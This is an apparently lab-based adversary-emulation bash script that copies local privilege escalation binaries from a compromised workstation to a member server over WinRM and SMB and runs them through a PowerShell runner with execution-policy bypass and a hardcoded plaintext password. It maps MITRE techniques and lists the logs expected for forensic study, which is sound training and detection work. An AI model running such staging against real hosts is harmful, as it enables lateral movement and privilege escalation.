#!/usr/bin/env bash
# T043-alt — Local Privilege Escalation alternatives staged from ws01 to mbr01.
# Assumed-breach path: operator on provisioning .60 uses WinRM to ws01 .62,
# then ws01 copies LPE binaries to mbr01 .22 and tries them.
#
# MITRE: T1078 (Valid Accounts), T1570 (Lateral Tool Transfer), T1068 (Exploitation for Privilege Escalation)
# DFIR: Security 4624/4648, Sysmon 1/11 (file create on target), Zeek smb.log C$ access, WinRM 91/93.
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T043-ALT-LPE-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
MBR01="${MBR01:-192.168.77.22}"
PS1_LOCAL="${CAMPAIGN_A_LIB}/../windows/campaign-a-t043-lpe-alternatives.ps1"

echo "=== T043-ALT | ${CASE_ID} | T0=${T0} ==="

# 1. Ensure LPE binaries are present on the beachhead (ws01) from GitHub releases.
echo "[*] Ensuring LPE binaries on ws01 ( beachhead ) ..."
ws01_ensure_lpe_binaries

# 2. Stage the runner script on ws01 and execute it.
bash "${CAMPAIGN_A_LIB}/ws01-stage-file.sh" "${PS1_LOCAL}" "campaign-a-t043-lpe-alternatives.ps1"
ws01_exec_as analyst_t1 'T13r_An@lyst!' \
  "powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Tools\\cadre-attack\\campaign-a-t043-lpe-alternatives.ps1 -Target ${MBR01} -TargetFqdn mbr01.child.cadre.local -Username 'child.cadre.local\\analyst_t1' -Password 'T13r_An@lyst!' -ToolSource 'C:\\Tools\\ADTools'"

cadre_export "${CASE_ID}" T043-ALT "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T043-ALT complete ==="
